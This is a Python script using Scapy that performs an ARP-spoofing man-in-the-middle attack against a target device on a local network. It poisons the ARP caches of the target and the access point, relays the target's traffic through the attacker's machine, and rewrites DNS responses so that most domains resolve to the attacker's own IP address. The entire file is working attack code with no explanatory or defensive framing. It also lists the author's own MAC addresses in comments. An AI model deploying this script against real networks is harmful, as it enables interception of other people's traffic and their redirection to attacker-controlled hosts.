# known MAC addresses
#	my phone		:	b8:7b:c5:8a:31:ce
#	my spare laptop	:	80:e6:50:1b:84:3e

print("* importing libraries...\r"),
from scapy.all import *
import time
# print(" " * 24 + "\r"),

iface = 'en0'
interval = 0.1
ap_ip = '192.168.0.1'			# IP address of access point
ap_mac = None					# MAC address of access point
target_ip = '192.168.0.23'		# IP address of target
target_mac = None				# MAC address of target
fake_ip = '192.168.0.100'
repair_cache_enabled = True

dns_spoof_enabled = True
spoof_all_dns_responses = True
dns_spoofed_ip = '192.168.0.22'
spoof_list = []			# Spoof DNS records for these domains
avoid_spoof_list = ['i.imgur.com.', 'google.com.', 'mtalk.google.com.', 'www.google.com.', 'i.redd.it.']	# Don't spoof these DNS records

# automatic MAC address resolution for AP and target
def resolve_mac_address(ip):
	arp_reply = srp1(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op=1, pdst=ip), retry=10, timeout=0.5, iface=iface, verbose=0)
	if arp_reply:
		return(arp_reply[ARP].hwsrc)
if not ap_mac:
	ap_mac = resolve_mac_address(ap_ip)
	if ap_mac:
		print("* %s is at %s" % (ap_ip, ap_mac))
	else:
		print("* no ARP reply from %s" % ap_ip)
		exit()
if not target_mac:
	target_mac = resolve_mac_address(target_ip)
	if target_mac:
		print("* %s is at %s" % (target_ip, target_mac))
	else:
		print("* no ARP reply from %s" % target_ip)
		exit()

if iface == 'en0':
	local_mac = 'a0:99:9b:09:94:31'		# my MAC address
	if not local_mac:
		local_mac = get_if_hwaddr(iface)
	local_ip = '192.168.0.22'			# my IP address


def arp_announcement():
	sendp(Ether(dst='ff:ff:ff:ff:ff:ff', src=local_mac)/ARP(op=1, hwsrc=local_mac, psrc=fake_ip, hwdst='00:00:00:00:00:00', pdst=fake_ip), iface=iface, verbose=0)


def repair_arp_cache():
	pkt_repair_target = Ether(dst=target_mac, src=ap_mac)/ARP(op=2, hwsrc=ap_mac, psrc=ap_ip, hwdst=target_mac, pdst=target_ip)
	pkt_repair_router = Ether(dst=ap_mac, src=target_mac)/ARP(op=2, hwsrc=target_mac, psrc=fake_ip, hwdst=ap_mac, pdst=ap_ip)
	for _ in range(20):
		sendp(pkt_repair_target, iface=iface, verbose=0)
		time.sleep(0.1)
		sendp(pkt_repair_router, iface=iface, verbose=0)
		time.sleep(0.1)


def forward_from_target(pkt):

	pkt[Ether].src = local_mac
	pkt[Ether].dst = ap_mac
	if pkt.haslayer(IP):
		pkt[IP].src = fake_ip
		pkt[IP].chksum = None
	if pkt.haslayer(UDP):
		pkt[UDP].chksum = None
	if pkt.haslayer(TCP):
		pkt[TCP].chksum = None

	if pkt.haslayer(DNSQR):
		print("Q > %s" % pkt[DNS].qd.qname)

	sendp(pkt, iface=iface, verbose=0)


def forward_to_target(pkt):

	pkt[Ether].src = local_mac
	pkt[Ether].dst = target_mac
	if pkt.haslayer(IP):
		pkt[IP].dst = target_ip
		pkt[IP].chksum = None
		pkt[IP].len = None
	if pkt.haslayer(UDP):
		pkt[UDP].chksum = None
		pkt[UDP].len = None
	if pkt.haslayer(TCP):
		pkt[TCP].chksum = None

	if pkt.haslayer(DNSRR):
		if not pkt[DNSRR].rrname in avoid_spoof_list and dns_spoof_enabled:
			pkt[DNS].an.rdata = dns_spoofed_ip
			print("R > %s -> %s" % (pkt[DNS].an.rrname, dns_spoofed_ip))
		else:
			print("R > %s" % pkt[DNS].an.rrname)

	sendp(pkt, iface=iface, verbose=0)


def main():

	target_sniffer = AsyncSniffer(iface=iface, filter='src %s and ether src %s and not arp' % (target_ip, target_mac), prn=forward_from_target)
	target_sniffer.start()

	router_sniffer = AsyncSniffer(iface=iface, filter='dst %s and ether dst %s and ether src %s and not arp' % (fake_ip, local_mac, ap_mac), prn=forward_to_target)
	router_sniffer.start()

	arp_spoof_target = Ether(dst=target_mac, src=local_mac)/ARP(op=2, hwsrc=local_mac, psrc=ap_ip, hwdst=target_mac, pdst=target_ip)
	arp_spoof_router = Ether(dst=ap_mac, src=local_mac)/ARP(op=2, hwsrc=local_mac, psrc=fake_ip, hwdst=ap_mac, pdst=ap_ip)
	print("* packet forwarding init")

	arp_announcement()
	while True:
		sendp(arp_spoof_target, iface=iface, verbose=0)
		time.sleep(interval)
		sendp(arp_spoof_router, iface=iface, verbose=0)
		time.sleep(interval)


try:
	main()
except KeyboardInterrupt:
	if repair_cache_enabled:
		print("\n* repairing cache")
		repair_arp_cache()
	print("* done")
	exit()


